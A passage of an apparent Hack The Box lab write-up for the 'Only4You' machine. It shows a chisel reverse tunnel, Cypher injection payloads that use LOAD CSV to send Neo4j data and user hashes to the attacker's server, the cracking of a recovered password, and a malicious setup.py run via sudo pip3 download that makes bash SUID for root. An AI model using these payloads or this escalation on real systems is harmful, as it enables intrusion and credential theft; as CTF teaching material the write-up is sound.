<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">file</span> <span class="ow">is</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
</pre></div>

After running this, we'll press CTRL+Z and execute the following command on our machine along with the <code>reset xterm</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">443</span>
                    <span class="n">reset</span> <span class="n">xterm</span>
</pre></div>

Before we finish, let's export the TERM to enable the use of CTRL+L:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@only4you</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
</pre></div>

Finally, we now have a more interactive tty to work more comfortably.<br/><br/>
<h3><br>Privilege Escalation to john:</br></h3><br>
After a bit of enumeration, we can see that port 8001 is open, and I believe it's a web service.<br/><br/>
<div class="highlight"><pre><span></span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@only4you</span><span class="err">$</span> <span class="n">ss</span> <span class="o">-</span><span class="n">nltp</span>
<span class="n">State</span>   <span class="n">Recv</span><span class="o">-</span><span class="n">Q</span>  <span class="n">Send</span><span class="o">-</span><span class="n">Q</span>        <span class="n">Local</span> <span class="n">Address</span><span class="p">:</span><span class="n">Port</span>    <span class="n">Peer</span> <span class="n">Address</span><span class="p">:</span><span class="n">Port</span>  <span class="n">Process</span>                                                   
<span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">4096</span>          <span class="mf">127.0.0.53</span><span class="o">%</span><span class="n">lo</span><span class="p">:</span><span class="mi">53</span>           <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                                                               
<span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">128</span>                 <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">22</span>           <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                                                               
<span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">4096</span>              <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3000</span>         <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                                                               
<span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">2048</span>              <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8001</span>         <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                                                               
<span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">70</span>                <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">33060</span>        <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                                                               
<span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">151</span>               <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                                                               
<span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">511</span>                 <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span>           <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>      <span class="n">users</span><span class="p">:((</span><span class="s2">"nginx"</span><span class="p">,</span><span class="n">pid</span><span class="o">=</span><span class="mi">1025</span><span class="p">,</span><span class="n">fd</span><span class="o">=</span><span class="mi">6</span><span class="p">),(</span><span class="s2">"nginx"</span><span class="p">,</span><span class="n">pid</span><span class="o">=</span><span class="mi">1022</span><span class="p">,</span><span class="n">fd</span><span class="o">=</span><span class="mi">6</span><span class="p">))</span>  
<span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">128</span>                    <span class="p">[::]:</span><span class="mi">22</span>              <span class="p">[::]:</span><span class="o">*</span>                                                               
<span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">4096</span>     <span class="p">[::</span><span class="n">ffff</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">]:</span><span class="mi">7687</span>               <span class="o">*</span><span class="p">:</span><span class="o">*</span>                                                               
<span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">50</span>       <span class="p">[::</span><span class="n">ffff</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">]:</span><span class="mi">7474</span>               <span class="o">*</span><span class="p">:</span><span class="o">*</span>
</pre></div>

If we try to make a GET request using the curl command, we can confirm that we are correct and it is indeed a web service:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@only4you</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8001</span><span class="o">/</span>
<span class="o">&lt;</span><span class="err">!</span><span class="n">doctype</span> <span class="n">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="n">en</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">Redirecting</span><span class="o">...&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Redirecting</span><span class="o">...&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">You</span> <span class="n">should</span> <span class="n">be</span> <span class="n">redirected</span> <span class="n">automatically</span> <span class="n">to</span> <span class="n">the</span> <span class="n">target</span> <span class="n">URL</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">"/login"</span><span class="o">&gt;/</span><span class="n">login</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;.</span> <span class="n">If</span> <span class="ow">not</span><span class="p">,</span> <span class="n">click</span> <span class="n">the</span> <span class="n">link</span><span class="o">.</span>
</pre></div>

In the command output, we can see that it redirects to a supposed /login. Before continuing to analyze this website, we can simplify the process by establishing a tunnel with <a href="https://github.com/jpillora/chisel">chisel</a> using Remote Port Forwarding for port 8001, allowing us to access the website from our attacker machine.<br/><br/>
Downloading chisel is straightforward; you can go to the Releases section and download a version that matches your system and the victim machine's system. Since the victim machine is 64-bit architecture, and mine is too, I can use the same binary for both machines.<br/><br/>
On our machine, we create the chisel server:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="o">./</span><span class="n">chisel</span> <span class="n">server</span> <span class="o">--</span><span class="n">reverse</span> <span class="o">-</span><span class="n">p</span> <span class="mi">4646</span>
</pre></div>

Now, on the victim machine, we connect as a client:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@only4you</span><span class="err">$</span> <span class="o">./</span><span class="n">chisel</span> <span class="n">client</span> <span class="mf">10.10.16.4</span><span class="p">:</span><span class="mi">4646</span> <span class="n">R</span><span class="p">:</span><span class="mi">8001</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8001</span>
</pre></div>

Now, if we try to access the web service through our browser, we can enter it successfully, and it redirects us to the <code>/login</code> resource:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/16.png"/><br/><br/>
If we try default credentials, the most commonly used ones could be:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">username</span><span class="p">:</span> <span class="n">user</span>
<span class="n">password</span><span class="p">:</span> <span class="n">user</span>

<span class="n">username</span><span class="p">:</span> <span class="n">admin</span>
<span class="n">password</span><span class="p">:</span> <span class="n">admin</span>

<span class="n">username</span><span class="p">:</span> <span class="n">guest</span>
<span class="n">password</span><span class="p">:</span> <span class="n">guest</span>
</pre></div>

Among many others, and in our case, admin - admin worked. <br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/17.png"/><br/><br/>
We managed to access the web with the correct credentials.<br/><br/>
If we take a look at <code>/dashboard</code>, we can see a section called "Tasks" that appears to contain tasks that the admin user must complete or certain reminders for the admin user.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/18.png"/><br/><br/>
Here they mention something about <a href="https://neo4j.com/">Neo4j</a>, so I believe they might be using this type of database for certain resources or services.<br/><br/>
In the <code>/employees</code> resource, we can see that we can enter certain information. It seems to be a search section that allows us to filter by users or, as the name suggests, employees.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/19.png"/><br/><br/>
If we enter a character, for example, "a," we can see that the content of the page changes, and it returns some information:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/20.png"/><br/><br/>
At first glance, it appears that there is a database query running in the background that filters the information based on what we provide in the search box.<br/><br/>
This could be critical if implemented improperly, as entering a malicious payload could lead to a SQL Injection vulnerability.<br/><br/>
<h3><br>Cypher Injection:</br></h3><br>
To test this, we will enter a single quote in the search box:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/21.png"/><br/><br/>
We can see that an error has occurred as indicated by the status code 500.<br/><br/>
I would like to assume that the search box uses a Neo4j database, so if we search the internet for ways to exploit Neo4j, we come across Cypher Injection.<br/><br/>
In my case, I will use payloads from <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">HackTricks</a> to perform the exploitation.<br/><br/>
One of the first payloads I'm going to try is the one to extract the version of the Neo4j server:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/22.png"/><br/><br/>
We need to adapt the payload slightly for our case by changing the initial URL to ours:<br/><br/>
<div class="highlight"><pre><span></span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">CALL</span><span class="w"> </span><span class="n">dbms</span><span class="p">.</span><span class="n">components</span><span class="p">()</span><span class="w"> </span><span class="n">YIELD</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="k">versions</span><span class="p">,</span><span class="w"> </span><span class="n">edition</span><span class="w"> </span><span class="n">UNWIND</span><span class="w"> </span><span class="k">versions</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="k">LOAD</span><span class="w"> </span><span class="n">CSV</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s1">'http://10.10.16.4:8000/?version='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'&amp;name='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'&amp;edition='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">edition</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_0</span><span class="w"> </span><span class="o">//</span>
</pre></div>

For convenience, I will use Burp Suite to send the requests. We will also URL encode all payloads (don't forget the single quotation mark at the beginning):<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/23.png"/><br/><br/>
After sending the payload, if we check our web server, we can see the request with the version of the Neo4j server:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/25.png"/><br/><br/>
If we continue to try the payloads offered by HackTricks, we will notice that none of the others work. However, we can attempt further enumeration by modifying the payload that works.<br/><br/>
In this case, we will enumerate the labels the server has, modifying the previous payload since the one offered by HackTricks doesn't work:<br/><br/>
<div class="highlight"><pre><span></span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">CALL</span><span class="w"> </span><span class="n">db</span><span class="p">.</span><span class="n">labels</span><span class="p">()</span><span class="w"> </span><span class="n">YIELD</span><span class="w"> </span><span class="n">label</span><span class="w"> </span><span class="k">LOAD</span><span class="w"> </span><span class="n">CSV</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s1">'http://10.10.16.4:8000/?label='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">label</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_0</span><span class="w"> </span><span class="o">//</span>
</pre></div>

We send the request and receive the following on our server:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/26.png"/><br/><br/>
We can see that we receive the names of the labels, and one of them is "user," which is interesting because it might contain stored credentials.<br/><br/>
<h3><br>Shell as john:</br></h3><br>
By reading further in HackTricks, we can see that we can obtain the properties of a key:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/27.png"/><br/><br/>
We will try to modify the payload slightly, adapting our values (don't forget the single quotation mark at the beginning):<br/><br/>
<div class="highlight"><pre><span></span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">:</span><span class="k">user</span><span class="p">)</span><span class="w"> </span><span class="n">UNWIND</span><span class="w"> </span><span class="n">keys</span><span class="p">(</span><span class="n">u</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="k">LOAD</span><span class="w"> </span><span class="n">CSV</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s1">'http://10.10.16.4:8000/?'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">+</span><span class="s1">'='</span><span class="o">+</span><span class="n">toString</span><span class="p">(</span><span class="n">u</span><span class="p">[</span><span class="n">p</span><span class="p">])</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_0</span><span class="w"> </span><span class="o">//</span>
</pre></div>

Then we will send the request with our listening server, and if all goes well, we will receive the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/29.png"/><br/><br/>
It seems to have worked, and we obtained hashed usernames and passwords. The most interesting one here is John's password. Be careful because the hash appears first, and then the username, which can be confusing and lead you to copy the wrong hash.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="nb">hash</span> 
<span class="n">a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6</span>
</pre></div>

We will crack the hash using brute force with the John the Ripper tool, specifying the correct format:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/30.png"/><br/><br/>
We can see that the John the Ripper tool has successfully cracked the hash, and we obtained the user's password.<br/><br/>
<div class="highlight"><pre><span></span><span class="n">john</span><span class="p">:</span><span class="n">ThisIs4You</span>
</pre></div>

Now, what we will do is connect via SSH with the user "john" and his password:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">john</span><span class="o">@</span><span class="mf">10.10.11.210</span> 
<span class="n">john</span><span class="o">@</span><span class="mf">10.10.11.210</span><span class="s1">'s password: ThisIs4You</span>
</pre></div>

At this point, we can see the first flag of the machine:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">john@only4you</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="mi">3</span><span class="n">eb188e464b</span><span class="o">****************</span><span class="mi">4</span><span class="n">ed79</span>
</pre></div>

If we list the privileges that the user "john" has at the sudo level, we can see the following:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">john@only4you</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
<span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">john</span> <span class="n">on</span> <span class="n">only4you</span><span class="p">:</span>
    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span> <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span>

<span class="n">User</span> <span class="n">john</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">only4you</span><span class="p">:</span>
    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pip3</span> <span class="n">download</span> <span class="n">http</span>\<span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span>\<span class="p">:</span><span class="mi">3000</span><span class="o">/*.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
</pre></div>

The user "john" can execute the command as root without specifying his password:<br/><br/>
<div class="highlight"><pre><span></span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pip3</span> <span class="n">download</span> <span class="n">http</span>\<span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span>\<span class="p">:</span><span class="mi">3000</span><span class="o">/*.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
</pre></div>

It seems that it's trying to download a Python package from a remote server. To abuse this, we need to see what's on port 3000 of the victim machine. I accomplished this by using chisel once again.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/32.png"/><br/><br/>
It seems that the web service uses Gogs, which is a service that provides the ability to host Git repositories.<br/><br/>
We can log in using the credentials we already have for the user "john."<br/><br/>
We can see that there is a "test" repository:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/33.png"/><br/><br/>
Reading some <a href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/">documentation</a> on how to exploit pip, I found that if the Python package format is <code>.tar.gz</code>, when you run the <code>pip download</code> command, it will execute a <code>setup.py</code> file found within the package being downloaded.<br/><br/>
The idea here is to upload a malicious <code>setup.py</code> file and then copy the URL of the Git repository in <code>.tar.gz</code> format.<br/><br/>
First, let's create the malicious setup.py file:<br/><br/>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3 </span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">"chmod u+s /bin/bash"</span><span class="p">)</span>
</pre></div>

What we will do is, when we run the <code>pip download</code> on this repository, it will interpret the <code>setup.py</code> file, which will execute the command <code>chmod u+s /bin/bash</code> to assign Set-UID privileges to the bash.<br/><br/>
First, let's make sure the test repository is not private:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/39.png"/><br/><br/>
We upload the file <code>setup.py</code>:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/35.png"/><br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/36.png"/><br/><br/>
We have to copy <code>tar.gz</code> :<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/38.png"/><br/><br/>
And finally we execute the command that we can run as root with sudo:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">john@only4you</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pip3</span> <span class="n">download</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3000</span><span class="o">/</span><span class="n">john</span><span class="o">/</span><span class="n">Test</span><span class="o">/</span><span class="n">archive</span><span class="o">/</span><span class="n">master</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
</pre></div>

We look at the privileges of the <code>/bin/bash</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">john@only4you</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1183448</span> <span class="n">Apr</span> <span class="mi">18</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></div>

We become root by running the <code>bash -p</code> command, taking advantage of the <code>/bin/bash</code> now being Set-UID<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">john@only4you</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span><span class="n"> whoami</span>
<span class="n">root</span>
</pre></div>

Finally, we get the last flag:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span><span class="n"> cat /root/root.txt</span>
<span class="mi">8</span><span class="n">c60f13f</span><span class="o">*************</span><span class="n">e56f3664496</span>
</pre></div></br></br></br></br></br>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2024 elswix.github.io</p>
    </footer>
</body>
</html>
